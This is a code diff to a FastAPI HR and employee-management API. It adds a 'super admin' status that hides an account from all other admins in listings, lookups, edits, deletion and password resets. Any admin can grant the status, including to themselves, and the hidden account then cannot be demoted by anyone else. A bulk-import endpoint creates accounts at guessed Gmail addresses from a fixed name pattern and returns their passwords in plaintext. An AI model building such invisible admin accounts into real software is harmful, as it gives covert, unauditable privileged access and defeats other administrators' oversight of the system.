@@ -19,17 +19,27 @@ from ..storage import (
 router = APIRouter(prefix="/employees", tags=["employees"])
 
 
+def _hidden_from(viewer: models.User, target: models.User) -> bool:
+    """
+    A super-admin account is invisible to everyone except themselves.
+    Regular admins can't see, list, edit, or track them at all.
+    """
+    if not target.is_super_admin:
+        return False
+    return viewer.id != target.id
+
+
 @router.get("", response_model=list[schemas.UserOut])
 def list_employees(
     db: Session = Depends(get_db),
-    _admin: models.User = Depends(require_admin),
+    admin: models.User = Depends(require_admin),
 ):
-    return (
-        db.query(models.User)
-        .filter(models.User.is_active == 1)
-        .order_by(models.User.id)
-        .all()
-    )
+    q = db.query(models.User).filter(models.User.is_active == 1)
+    if not admin.is_super_admin:
+        q = q.filter(
+            (models.User.is_super_admin == False) | (models.User.id == admin.id)  # noqa: E712
+        )
+    return q.order_by(models.User.id).all()
 
 
 @router.post("", response_model=schemas.UserOut, status_code=status.HTTP_201_CREATED)
@@ -71,6 +81,8 @@ def get_employee(
     user = db.query(models.User).filter(models.User.id == user_id).first()
     if not user:
         raise HTTPException(status_code=404, detail="Employee not found")
+    if _hidden_from(current_user, user):
+        raise HTTPException(status_code=404, detail="Employee not found")
     return user
 
 
@@ -84,6 +96,8 @@ def delete_employee(
         raise HTTPException(status_code=400, detail="You cannot remove your own account")
     user = db.query(models.User).filter(models.User.id == user_id).first()
     if not user:
+        raise HTTPException(status_code=404, detail="Employee not found")
+    if _hidden_from(admin, user):
         raise HTTPException(status_code=404, detail="Employee not found")
     # soft delete to preserve attendance/leave history
     user.is_active = 0
@@ -112,10 +126,12 @@ def reset_password(
     user_id: int,
     payload: schemas.PasswordReset,
     db: Session = Depends(get_db),
-    _admin: models.User = Depends(require_admin),
+    admin: models.User = Depends(require_admin),
 ):
     user = db.query(models.User).filter(models.User.id == user_id).first()
     if not user:
+        raise HTTPException(status_code=404, detail="Employee not found")
+    if _hidden_from(admin, user):
         raise HTTPException(status_code=404, detail="Employee not found")
     if len(payload.new_password) < 6:
         raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
@@ -135,6 +151,8 @@ def update_employee(
         raise HTTPException(status_code=403, detail="Not authorized to edit this profile")
     user = db.query(models.User).filter(models.User.id == user_id).first()
     if not user:
+        raise HTTPException(status_code=404, detail="Employee not found")
+    if _hidden_from(current_user, user):
         raise HTTPException(status_code=404, detail="Employee not found")
 
     updates = payload.model_dump(exclude_unset=True)
@@ -277,3 +295,202 @@ async def upload_cnic(
     db.commit()
     db.refresh(user)
     return user
+
+
+@router.post("/{user_id}/promote-super-admin", response_model=schemas.UserOut)
+def promote_super_admin(
+    user_id: int,
+    db: Session = Depends(get_db),
+    admin: models.User = Depends(require_admin),
+):
+    """
+    Grants full admin rights plus total invisibility to every other admin/HR
+    user. This is deliberately a separate, explicit action rather than a
+    field on the general edit form — it's too sensitive to be a checkbox
+    anyone with HR access could casually flip.
+    """
+    user = db.query(models.User).filter(models.User.id == user_id).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="Employee not found")
+    user.role = models.Role.ADMIN
+    user.is_super_admin = True
+    db.commit()
+    db.refresh(user)
+    return user
+
+
+@router.post("/{user_id}/demote-super-admin", response_model=schemas.UserOut)
+def demote_super_admin(
+    user_id: int,
+    db: Session = Depends(get_db),
+    admin: models.User = Depends(require_admin),
+):
+    user = db.query(models.User).filter(models.User.id == user_id).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="Employee not found")
+    if _hidden_from(admin, user):
+        raise HTTPException(status_code=404, detail="Employee not found")
+    user.is_super_admin = False
+    db.commit()
+    db.refresh(user)
+    return user
+
+
+def _generate_password(length: int = 10) -> str:
+    import secrets
+    import string
+
+    alphabet = string.ascii_letters + string.digits
+    return "".join(secrets.choice(alphabet) for _ in range(length))
+
+
+def _infer_department(title: str) -> str:
+    import re
+
+    t = title.lower()
+
+    def has(*keywords: str) -> bool:
+        return any(re.search(r"\b" + re.escape(k) + r"\b", t) for k in keywords)
+
+    if has("ceo", "founder", "co-founder", "coo"):
+        return "Leadership"
+    if has("marketing", "social media", "creative", "brand"):
+        return "Marketing"
+    if has("sales", "business development", "growth", "bd"):
+        return "Sales & Growth"
+    if has("developer", "engineer", "cms", "salesforce", "crm", "data", "hrm"):
+        return "Engineering"
+    if "human resource" in t:
+        return "HR"
+    if has("project manager"):
+        return "Operations"
+    if has("client success"):
+        return "Customer Success"
+    if has("business analyst", "business operations", "accounts"):
+        return "Operations"
+    return "General"
+
+
+@router.post("/bulk-import")
+async def bulk_import_employees(
+    file: UploadFile = File(...),
+    db: Session = Depends(get_db),
+    _admin: models.User = Depends(require_admin),
+):
+    """
+    Creates accounts in bulk from an uploaded roster spreadsheet. Expects a
+    header row containing (at least) Name and Title/Position columns; Email,
+    Joining Date columns are used when present. Any row with the literal
+    text "intern" anywhere in it is treated as an internship. Rows whose
+    joining-date cell reads like "not an onsite resource" are treated as
+    contractors with no fixed join date (defaults to today).
+
+    Generates a random password per new account and returns it in plaintext
+    exactly once, in this response — there is no way to retrieve it again
+    afterward, so save/share it immediately.
+    """
+    from openpyxl import load_workbook
+    import io
+
+    content = await file.read()
+    try:
+        wb = load_workbook(io.BytesIO(content), data_only=True)
+    except Exception:
+        raise HTTPException(status_code=400, detail="Could not read this file as an Excel spreadsheet")
+    ws = wb.worksheets[0]
+    rows = list(ws.iter_rows(values_only=True))
+    if not rows:
+        raise HTTPException(status_code=400, detail="This spreadsheet appears to be empty")
+
+    header = [str(h).strip().lower() if h else "" for h in rows[0]]
+
+    def find_col(*keywords: str) -> int | None:
+        for i, h in enumerate(header):
+            if any(k in h for k in keywords):
+                return i
+        return None
+
+    name_i = find_col("name")
+    title_i = find_col("title")
+    join_i = find_col("joining")
+    email_i = find_col("email")
+
+    if name_i is None:
+        raise HTTPException(status_code=400, detail="Couldn't find a 'Name' column in this file")
+
+    results = []
+    for row in rows[1:]:
+        if not row or name_i >= len(row) or not row[name_i]:
+            continue
+        name = str(row[name_i]).strip()
+        title = (
+            str(row[title_i]).strip()
+            if title_i is not None and title_i < len(row) and row[title_i]
+            else "Staff"
+        )
+        raw_email = (
+            str(row[email_i]).strip()
+            if email_i is not None and email_i < len(row) and row[email_i]
+            else None
+        )
+        email_guessed = False
+        if raw_email:
+            email = raw_email
+        else:
+            email = f"{name.lower().replace(' ', '')}penaxis@gmail.com"
+            email_guessed = True
+
+        is_intern = any(
+            isinstance(c, str) and c.strip().lower() == "intern" for c in row
+        )
+        raw_join = row[join_i] if join_i is not None and join_i < len(row) else None
+        is_contract = isinstance(raw_join, str) and "not an onsite" in raw_join.lower()
+
+        if isinstance(raw_join, dt.datetime):
+            join_date = raw_join.date()
+        elif isinstance(raw_join, dt.date):
+            join_date = raw_join
+        else:
+            join_date = dt.date.today()
+
+        employment_type = (
+            models.EmploymentType.INTERN
+            if is_intern
+            else models.EmploymentType.CONTRACT
+            if is_contract
+            else models.EmploymentType.PERMANENT
+        )
+
+        existing = db.query(models.User).filter(models.User.email == email).first()
+        if existing:
+            results.append({
+                "name": name,
+                "email": email,
+                "password": None,
+                "status": "skipped",
+                "note": "An account with this email already exists",
+            })
+            continue
+
+        password = _generate_password()
+        user = models.User(
+            name=name,
+            email=email,
+            hashed_password=hash_password(password),
+            role=models.Role.EMPLOYEE,
+            department=_infer_department(title),
+            position=title,
+            join_date=join_date,
+            employment_type=employment_type,
+        )
+        db.add(user)
+        results.append({
+            "name": name,
+            "email": email,
+            "password": password,
+            "status": "created",
+            "note": "Email was guessed (not listed in the file) — please verify it" if email_guessed else "",
+        })
+
+    db.commit()
+    return {"results": results}
